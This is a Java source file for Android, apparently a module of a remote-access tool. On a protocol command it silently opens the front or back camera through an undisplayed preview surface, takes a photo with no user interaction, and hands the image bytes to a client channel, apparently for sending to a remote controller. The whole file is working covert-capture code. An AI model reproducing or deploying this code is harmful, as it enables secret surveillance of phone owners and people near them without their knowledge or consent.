package my.app.Library;

import inout.Protocol;

import java.io.IOException;

import my.app.client.ClientListener;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.hardware.Camera.PictureCallback;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceView;

@SuppressWarnings("deprecation")
public class PhotoTaker {
	Camera cam;
	ClientListener ctx;
	int chan;
	SurfaceHolder holder;
	int type;

	private PictureCallback pic = new PictureCallback() {

		public void onPictureTaken(byte[] data, Camera camera) {

			ctx.handleData(chan, data);
			Log.i("PhotoTaker", "After take picture !");
			cam.release();
			cam = null;
		}
	};

	public PhotoTaker(ClientListener c, int chan, int type) {
		this.chan = chan;
		Log.e("chan", "chan:" + chan);
		ctx = c;
		this.type = type;
	}

	/*
	 * public boolean takePhoto() { Intent photoActivity = new Intent(ctx,
	 * CameraActivity.class);
	 * photoActivity.setAction(PhotoTaker.class.getName()); Log.e("PhotoTaker",
	 * PhotoTaker.class.getName());
	 * photoActivity.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	 * ctx.startActivity(photoActivity); return true; }
	 */

	public boolean takePhoto() {
		if (!(ctx.getApplicationContext().getPackageManager()
				.hasSystemFeature(PackageManager.FEATURE_CAMERA)))
			return false;
		Log.i("PhotoTaker", "Just before Open !");
		try {
			
			int CammeraIndex = -1;
			if (type == Protocol.GET_PICTURE) {
				CammeraIndex = FindBackCamera();
			} else {
				CammeraIndex = FindFrontCamera();
			}
			if (CammeraIndex != -1) {
				Log.e("takePhoto", "CammeraIndex");
				cam = Camera.open(CammeraIndex);
			} else {
				Log.e("takePhoto", "2222");
				cam = Camera.open();
			}
			Log.e("takePhoto", "1");
		} catch (Exception e) {
			Log.e("takePhoto", e.getMessage());
			return false;
		}

		Log.i("PhotoTaker", "Right after Open !");

		if (cam == null)
			return false;

		SurfaceView view = new SurfaceView(ctx);
		try {
			holder = view.getHolder();
			cam.setPreviewDisplay(holder);
		} catch (IOException e) {
			return false;
		}

		cam.startPreview();
		cam.takePicture(null, null, pic);

		return true;
	}

	private int FindFrontCamera() {
		int cameraCount = 0;
		Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
		cameraCount = Camera.getNumberOfCameras(); // get cameras number

		for (int camIdx = 0; camIdx < cameraCount; camIdx++) {
			Camera.getCameraInfo(camIdx, cameraInfo); // get camerainfo
			if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
				// 代表摄像头的方位，目前有定义值两个分别为CAMERA_FACING_FRONT前置和CAMERA_FACING_BACK后置
				return camIdx;
			}
		}
		return -1;
	}

	private int FindBackCamera() {
		int cameraCount = 0;
		Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
		cameraCount = Camera.getNumberOfCameras(); // get cameras number
		for (int camIdx = 0; camIdx < cameraCount; camIdx++) {
			Camera.getCameraInfo(camIdx, cameraInfo); // get camerainfo
			if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
				// 代表摄像头的方位，目前有定义值两个分别为CAMERA_FACING_FRONT前置和CAMERA_FACING_BACK后置
				return camIdx;
			}
		}
		return -1;
	}

}
